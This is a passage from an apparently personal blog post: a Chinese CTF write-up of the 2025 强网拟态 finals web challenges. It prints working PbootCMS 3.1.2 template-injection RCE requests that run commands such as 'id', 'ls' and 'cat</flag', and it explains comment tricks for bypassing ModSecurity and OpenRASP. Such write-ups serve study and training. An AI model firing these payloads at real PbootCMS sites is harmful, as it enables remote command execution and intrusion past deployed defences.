@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="为什么现在才发呢？因为还有15天就要公安联考了。今天周五主要想复现一下joomlaCMS的0day。 云网互联赛道Web-11本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。    https:&#x2F;&#x2F;cn-sec.com&#x2F;archives&#x2F;266">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025强网拟态决赛 wp">
+<meta property="og:url" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="为什么现在才发呢？因为还有15天就要公安联考了。今天周五主要想复现一下joomlaCMS的0day。 云网互联赛道Web-11本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。    https:&#x2F;&#x2F;cn-sec.com&#x2F;archives&#x2F;266">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/1.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/2.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/3.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/4.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/5.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/6.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/7.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/8.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/9.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/10.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/11.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/31.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/32.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/33.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/12.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/13.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/14.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/15.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/16.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/17.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/18.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/19.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/20.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/21.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/22.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/23.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/24.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/25.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/26.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/27.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/28.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/29.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/30.png">
+<meta property="article:published_time" content="2025-12-26T13:41:25.000Z">
+<meta property="article:modified_time" content="2025-12-26T13:45:11.725Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2025强网拟态决赛 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/12/20/CVE-2025-55182-Next-js%E6%97%A0%E6%9D%A1%E4%BB%B6RCE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&text=2025强网拟态决赛 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&is_video=false&description=2025强网拟态决赛 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025强网拟态决赛 wp&body=Check out this article: http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&title=2025强网拟态决赛 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&name=2025强网拟态决赛 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/&t=2025强网拟态决赛 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E7%BD%91%E4%BA%92%E8%81%94%E8%B5%9B%E9%81%93"><span class="toc-number">1.</span> <span class="toc-text">云网互联赛道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-1"><span class="toc-number">1.1.</span> <span class="toc-text">Web-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-2-1"><span class="toc-number">1.2.</span> <span class="toc-text">Web-2.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-2-2"><span class="toc-number">1.3.</span> <span class="toc-text">Web-2.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-3-1"><span class="toc-number">1.4.</span> <span class="toc-text">Web-3.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-3-2"><span class="toc-number">1.5.</span> <span class="toc-text">Web-3.2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">2.</span> <span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Joomla"><span class="toc-number">2.1.</span> <span class="toc-text">Joomla</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ezdatart"><span class="toc-number">2.2.</span> <span class="toc-text">Ezdatart</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2025强网拟态决赛 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-26T13:41:25.000Z" class="dt-published" itemprop="datePublished">2025-12-26</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>为什么现在才发呢？因为还有15天就要公安联考了。今天周五主要想复现一下joomlaCMS的0day。</p>
+<h2 id="云网互联赛道"><a href="#云网互联赛道" class="headerlink" title="云网互联赛道"></a>云网互联赛道</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web-1"></a>Web-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。本赛题使用开源网站框架PbootCMS（版本：3.1.2）搭建了Web应用，且未采用任何安全防护技术。</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/1.png" class="" title="image-20251126170052844">
+
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2668654.html">https://cn-sec.com/archives/2668654.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?member/login/?suanve=&#125;&#123;pboot:if((get_lg/*s-*/())/**/(get_backurl/*s-*/()))&#125;123&#123;/pboot:if&#125;&amp;backurl=;id HTTP/1.1</span><br><span class="line">Host: 172.29.60.11</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web-2-1"><a href="#Web-2-1" class="headerlink" title="Web-2.1"></a>Web-2.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本赛题在赛题Web-1的基础上，额外部署了开源的ModSecurity（版本：3.0.14）为Web应用提供安全防护。</span><br></pre></td></tr></table></figure>
+
+<p>部署了防火墙</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/2.png" class="" title="image-20251126170240418">
+
+<p>发现我们的请求被Forbidden了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?member/login/?&#123;&#123;urld(%23)&#125;&#125;=&#125;&#123;pboot:if((get_lg/*-*/())(&#x27;cat&lt;/flag&#x27;))&#125;&#123;/pboot:if&#125;) HTTP/1.1</span><br><span class="line">Host: 172.29.60.11</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/3.png" class="" title="image-20251126174941911">
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/4.png" class="" title="image-20251126175154539">
+
+<p>其实就是把变量名改成注释符，这样后面就不会被检测到了</p>
+<p>上面的可能不太好理解，下面还有一种方式：</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/5.png" class="" title="image-20251126202216770">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?member/login/?x=#&#125;&#123;pboot:if((get_lg/*-*/())(&#x27;cat&lt;/flag&#x27;))&#125;&#123;/pboot:if&#125;) HTTP/1.1</span><br><span class="line">Host: 172.29.60.12</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web-2-2"><a href="#Web-2-2" class="headerlink" title="Web-2.2"></a>Web-2.2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本赛题在赛题Web-1的基础上，额外部署了开源的OpenRASP（版本：1.3.7）为Web应用提供安全防护。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?member/login/?a=&#125;&#123;pboot:if((get_lg/*aaa-*/())(&quot;ls&quot;))&#125;&#123;/pboot:if&#125; HTTP/1.1</span><br><span class="line">Host: 172.29.60.12</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: XDEBUG_SESSIO1N=17340; lg=system; PbootSystem=8g1gcjum9vbcbqeh6epc5hlloa</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/6.png" class="" title="image-20251126174513782">
+
+
+
+<p>还有Web-2.1的poc在这里也行</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/7.png" class="" title="image-20251126202433150">
+
+
+
+
+
+<h3 id="Web-3-1"><a href="#Web-3-1" class="headerlink" title="Web-3.1"></a>Web-3.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本赛题在赛题Web-1的基础上，采用了同构冗余+负载均衡的架构设计，并集成了ModSecurity + OpenRASP的安全防护机制（两者版本号不变）。</span><br></pre></td></tr></table></figure>
+
+<p>说白了就是2.1和2.2的结合体</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/8.png" class="" title="image-20251126203147976">
+
+<p>但是发现换了好几个命令执行函数都不行，直接试试读文件</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/9.png" class="" title="image-20251126203228163">
+
+
+
+
+
+<h3 id="Web-3-2"><a href="#Web-3-2" class="headerlink" title="Web-3.2"></a>Web-3.2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本赛题在赛题Web-1的基础上，采用了Web应用异构化技术，并集成了ModSecurity+OpenRASP的安全防护机制（两者版本号不变）。</span><br></pre></td></tr></table></figure>
+
+<p>多了异构化技术，这里解释一下</p>
+<p><strong>Web应用异构化技术</strong> 指的是 <strong>有意地、动态地让一个Web应用的不同实例（或在不同时间点）呈现出不同的特征和行为</strong>，从而增加攻击者的认知和攻击难度，提升系统防御能力的技术。</p>
+<img src="/2025/12/26/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B-wp/10.png" class="" title="image-20251126203523022">
+
+<p>上述poc在Web-3.1是可以的，但是在这里不可以，他说方法未定义？</p>
